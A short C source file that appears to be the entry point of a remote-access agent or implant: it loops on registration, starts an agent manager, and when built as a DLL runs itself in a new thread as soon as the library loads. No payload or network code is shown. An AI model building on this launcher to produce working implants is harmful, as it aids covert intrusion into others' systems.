#include "Core/Registration.h"
#include "Hams.h"
#include "Core/Tasks/Tasks.h"
#include "Core/Tasks/Core.h"
#include "Core/Initialiser.h"
#include "Config.h"
#include "Debug.h"

int Run()
{

    Initialiser();
    while (!Registration());       
    AgentManager();
}




#if defined(DLL)


#define EXTERN_DLL_EXPORT extern  __declspec(dllexport)

#if defined(ExportFunctionName)
EXTERN_DLL_EXPORT int ExportFunctionName() {
    Run();
  return 1;
}


#else
BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD dwReason, LPVOID lpReserved) {
  BOOL bReturnValue = TRUE;

  switch (dwReason) {

  case DLL_PROCESS_ATTACH: {


    CreateThread(NULL, 0, Run, 0, 0, 0);

  }

  case DLL_PROCESS_DETACH:
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
    break;
  }
  return bReturnValue;
}
#endif

#else

int main()
{
  
    Run();
}

#endif